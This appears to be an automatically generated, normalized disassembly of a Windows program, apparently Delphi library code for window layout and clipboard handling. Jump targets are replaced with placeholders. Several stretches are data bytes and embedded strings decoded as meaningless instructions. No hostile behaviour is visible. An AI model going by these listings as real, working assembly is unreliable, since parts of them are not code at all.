mov eax [ esi + 0x210 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44631c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_428998
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41d414
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_428b21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_4445f8
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43dd18
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_43d7fc
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_413de4
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
sub_428b30
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413e40
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43da04
mov eax ebx
mov si 0xffeb
call sub_40349c
sub_428b68
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_428ce0
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_428bdc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_428700
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_413ecc
call sub_4032a0
pop edi
pop esi
pop ebx
retn
sub_428c1c
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_428998
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_428c54
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_413de4
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413de4
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_428ce0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_428da9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_428bdc
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_428998
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428db0
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_413de4
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413de4
pop edx
call sub_43de28
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_428db8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_443ae4
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413de4
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_428e2c
inc esi
dec eax
add [ ecx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] dl
inc esi
dec eax
add [ esi ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] bl
inc esi
dec eax
add [ esi ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] al
inc esi
dec eax
add [ esi ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] cl
inc esi
dec eax
add [ esi ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax ] cl
sub [ eax ] ecx
pushfd
pop [ edx ]
add [ ecx ] ch
dec eax
add [ edi + ecx * 4 + 0x28f80042 ] dl
dec eax
add [ edi + ecx * 4 + 0x28f00042 ] cl
dec eax
add [ edi + ecx * 4 + 0x28e80042 ] al
dec eax
add [ edi + ecx * 4 + 0x42 ] bh
add al ah
sub [ eax ] cl
je r-xdata
inc esi
dec eax
inc edx
add al bl
sub [ eax ] cl
insb
pop [ edx ]
shr [ eax ] 0x1
dec eax
add [ edi + ecx * 4 + 0x42 ] ah
add al cl
sub [ eax ] cl
pop esp
pop [ edx ]
shr [ eax ] 0x48
add [ edi + ecx * 4 + 0x42 ] dl
add [ eax + 0x4c004828 ] bh
pop [ edx ]
mov al 0x28
dec eax
add [ edi + ecx * 4 + 0x42 ] al
add [ eax + 0x3c004828 ] ch
pop [ edx ]
mov al [ 0x34004828 ]
pop [ edx ]
cwde
sub [ eax ] cl
sub al 0x8f
inc edx
add [ eax + 0x24004828 ] dl
pop [ edx ]
mov [ eax ] ch
dec eax
add [ edi + ecx * 4 ] bl
inc edx
add [ eax + 0x14004828 ] al
pop [ edx ]
js r-xdata
dec eax
add ah ah
mov es [ edx ]
dec eax
sub [ eax ] cl
fmul [ esi + 0x28400042 ]
dec eax
add ah dl
mov es [ edx ]
cmp [ eax ] ch
dec eax
add ah cl
mov es [ edx ]
xor [ eax ] ch
dec eax
add ah al
mov es [ edx ]
sub [ eax ] ch
dec eax
add [ esi + ecx * 4 + 0x28200042 ] bh
dec eax
add [ esi + ecx * 4 + 0x28180042 ] dh
dec eax
add [ esi + ecx * 4 + 0x28100042 ] ch
dec eax
add [ esi + ecx * 4 + 0x28080042 ] ah
dec eax
add [ esi + ecx * 4 + 0x28000042 ] bl
dec eax
add [ esi + ecx * 4 + 0x27f80042 ] dl
dec eax
add [ esi + ecx * 4 + 0x27f00042 ] cl
dec eax
add [ esi + ecx * 4 + 0x27e80042 ] al
dec eax
add [ esi + ecx * 4 + 0x42 ] bh
add al ah
daa
dec eax
add [ esi + ecx * 4 + 0x42 ] dh
add al bl
daa
dec eax
add [ esi + ecx * 4 + 0x42 ] ch
add al dl
daa
dec eax
add [ esi + ecx * 4 + 0x42 ] ah
add al cl
daa
dec eax
add [ esi + ecx * 4 + 0x42 ] bl
add al al
daa
dec eax
add [ esi + ecx * 4 + 0x42 ] dl
add [ eax + 0x4c004827 ] bh
mov es [ edx ]
mov al 0x27
dec eax
add [ esi + ecx * 4 + 0x42 ] al
add [ eax + 0x3c004827 ] ch
mov es [ edx ]
mov al [ 0x34004827 ]
mov es [ edx ]
cwde
daa
dec eax
add [ esi + ecx * 4 ] ch
inc edx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42915c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
dec eax
add [ edi + ecx * 4 ] cl
inc edx
add [ eax + 0x28 ] dh
dec eax
add [ edi + ecx * 4 ] al
inc edx
add [ eax + 0x28 ] ch
dec eax
add ah bh
mov es [ edx ]
pushad
sub [ eax ] cl
hlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429163
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404afc
sub_429198
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4291bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4291c4
retn
sub_4291d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
xchg edx eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
xchg edx eax
inc edx
add [ eax ] dl
add [ eax ] al
add [ edx + ebx + 0x41 ] dl
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
movsb [ edi ] [ esi ]
xchg edi eax
inc edx
add [ ebp + edx * 4 + 0x42 ] ch
add [ eax ] ah
inc ebp
inc ecx
add ah bl
xchg esi eax
inc edx
add [ eax - 0x6d ] dl
inc edx
add [ eax - 0x6e ] ch
inc edx
add al cl
xchg edx eax
inc edx
add ah dh
xchg edx eax
inc edx
add [ edx ] cl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
nop
dec eax
xchg edx eax
inc edx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
sbb al 0x92
inc edx
add al cl
sbb al [ ecx ]
add [ eax ] al
pop es
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4292a0
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4292a7
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4292c8
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_41b2e4
sub_4292f4
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_429748
call sub_41b230
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
sub_429350
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_429370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4293e2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_404074
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_40426c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4293e9
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_4293f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_429492
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_420280
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_420190
call sub_403ad8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4294a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4294f8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4294ff
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_429508
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_42955d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429564
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42956c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4293f0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4294a0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414518
mov edx ebx
mov eax esi
call sub_429508
jmp r-xdata
pop esi
pop ebx
retn
sub_4295d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_429649
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4292ac
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_420254
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429650
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_429658
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4296cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4292ac
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4296d4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_4296dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4295d4
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_414434
mov edx ebx
mov eax esi
call sub_429658
jmp r-xdata
pop esi
pop ebx
retn
sub_429748
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429772
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429777
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403a54
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403aa8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4297a4
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4297d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429809
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429810
retn
mov eax [ rw-data ]
call sub_4032a0
sub_4298a4
test al 0x98
inc edx
add [ ebx ] al
or eax 0x74754254
je r-xdata
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
je r-xdata
inc ebx
inc edx
add [ eax + eax ] ah
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x99
jne r-xdata
or ah [ edx + 0x6c ]
inc edi
insb
bound ebp [ edi + eax * 2 + 0x6c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + ebx * 4 + 0x620b0042 ] ah
insb
inc edi
insb
jns r-xdata
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
inc eax
test eax 0xb0ac0041
inc edx
cld
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
push 0x68676952
je r-xdata
add ah ah
cdq
jns r-xdata
push 0x7466654c
or al 0x62
insb
inc edi
insb
add [ ebp + ecx * 8 + 0x43 ] bl
add [ eax + 0x80041a9 ] ch
into
inc ebx
add al bh
test al 0x41
add [ edx + esi + 0x40 ] dl
add [ eax - 0x57 ] al
inc ecx
add [ eax + esi * 4 - 0x568bffbe ] ch
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
jns r-xdata
or eax 0x6c476c62
jns r-xdata
bound ebp [ edi + eax * 2 + 0x6c ]
inc ecx
je r-xdata
add [ ecx + ebp * 4 + 0x41 ] dh
outsb
jae r-xdata
adc [ eax - 0x68 ] ch
cwde
inc edx
add bl al
jmp sub_4039f4
rol [ ecx + ebx * 4 ] 0x42
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
add [ ecx + ebp * 4 - 0x561fffbf ] cl
inc ecx
add [ eax - 0x34 ] cl
inc ebx
add al dl
mov al 0x42
add [ esp + ecx * 8 - 0x4ee3ffbd ] bh
inc edx
add [ eax - 0x5c ] ah
inc esp
add [ esi + ecx * 8 ] dh
inc ebx
add al dh
int3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
push 0x4299
sub_429af8
jmp r-xdata
inc [ ebx + edi * 4 + 0x42 ]
add [ ebx + edi * 4 + 0x42 ] ah
add [ eax + 0x80042bb ] bl
mov esp 0xbca00042
inc edx
add [ eax - 0x4fffbd44 ] ch
mov esp 0xbcd40042
inc edx
add [ eax - 0x43 ] cl
inc edx
add [ eax - 0x42 ] al
inc edx
add [ eax - 0x47 ] bl
inc edx
add [ ecx + edi * 4 + 0x42 ] al
add [ edi + esi * 4 + 0x42 ] cl
add [ edi + esi * 4 - 0x47bbffbe ] ah
inc edx
add [ ecx + edi * 4 ] bh
inc edx
add [ esp + edx * 2 ] cl
push ebx
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
inc edx
jne r-xdata
inc edx
insb
insb
push ebp
jo r-xdata
popad
add [ eax ] al
dec [ ecx + edx * 8 + 0x43 ]
add al ch
rol [ ebx ] 0x1
add [ eax ] al
add [ eax + 0x3 ] al
je r-xdata
add bh bh
in al 0x2
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ ecx + ebp ] bh
inc ecx
add [ eax + eax ] bh
add dh bh
insb
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
mov eax [ ebx ]
add [ eax ] eax
js r-xdata
outsb
nop
dec esp
fwait
inc edx
add [ edi ] al
or al 0x54
push ebx
jo r-xdata
add [ fs : eax ] al
jb r-xdata
